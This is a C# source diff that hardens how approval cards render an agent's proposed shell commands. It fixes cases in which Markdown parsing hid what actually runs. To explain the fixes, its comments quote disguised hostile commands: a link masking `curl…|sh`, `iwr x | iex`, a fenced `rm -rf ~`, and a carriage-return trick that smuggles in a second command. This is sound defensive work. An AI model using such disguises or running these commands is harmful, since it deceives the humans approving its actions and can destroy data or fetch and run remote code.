@@ -116,9 +116,17 @@ public static class MarkdownModel
         var lines = block.Lines;
         for (var i = 0; i < lines.Count; i++)
         {
-            if (i > 0) { b.Append('\n'); }
+            // Markdig ends a line at a bare CR as well, which a shell does not: `echo safe \r#; echo SECOND`
+            // drew its second command on a line of its own, looking commented out, while bash runs it.
+            // A bare CR is kept as the character it is, for HiddenText.Reveal to draw as `\u000D` (#220).
+            // NEL, LS and PS never end a line here, and Reveal escapes them where they are.
+            if (i > 0) { b.Append(lines.Lines[i - 1].NewLine == Markdig.Helpers.NewLine.CarriageReturn ? '\r' : '\n'); }
             b.Append(lines.Lines[i].Slice.ToString());
         }
+        // A code block's last line ends at a bare CR too when the closing fence or the message's end
+        // follows it: `printf '%s' safe\r` drew as `safe` with no escape, and pasted it ends the
+        // command. Its ordinary LF or CRLF ending is the fence's, not the block's.
+        if (block is CodeBlock && lines.Count > 0 && lines.Lines[lines.Count - 1].NewLine == Markdig.Helpers.NewLine.CarriageReturn) { b.Append('\r'); }
         return b.ToString();
     }
 
@@ -179,6 +187,12 @@ public static class MarkdownModel
                 case HtmlEntityInline entity:
                     list.Add(new MdText(entity.Transcoded.ToString(), style));
                     break;
+                // A pipe outside a table: left as a delimiter, it drew as nothing, so "iwr x | iex"
+                // read as "iwr x  iex" (#220). It is the character it is, then what follows it.
+                case DelimiterInline delimiter:
+                    list.Add(new MdText(delimiter.ToLiteral(), style));
+                    Walk(delimiter, style, list);
+                    break;
                 case ContainerInline inner:
                     Walk(inner, style, list);
                     break;
@@ -189,4 +203,15 @@ public static class MarkdownModel
     // Only http and https links are followed: a card must never start a program or open a file.
     public static string? Safe(string? url) =>
         Uri.TryCreate(url, UriKind.Absolute, out var u) && (u.Scheme == Uri.UriSchemeHttps || u.Scheme == Uri.UriSchemeHttp) ? u.AbsoluteUri : null;
+
+    // An approval's message as its card draws it (#220): exactly as written, fence markers
+    // included, as one block in the code face; nothing in it is read as Markdown. Whatever a parser
+    // decides can hide what runs. A Codex approval carries its command in prose, where a link drew
+    // `echo "[safe](https://a/";curl…|sh;")"` as `echo "safe"`; and a line of three backticks, which
+    // Markdown takes as a fence, is a command substitution to bash: `bash -c '` then a fenced
+    // `echo rm -rf ~` read as a harmless echo, and bash runs `rm -rf ~`. The block reveals what is
+    // not on screen as it runs, right-to-left letters and a bare CR included (CodeCopy), and reads
+    // left to right. Only CRLF line endings are taken as line breaks.
+    public static IReadOnlyList<MdBlock> Approval(string? markdown) =>
+        string.IsNullOrEmpty(markdown) ? [] : [new MdCode(markdown.Replace("\r\n", "\n"), null)];
 }
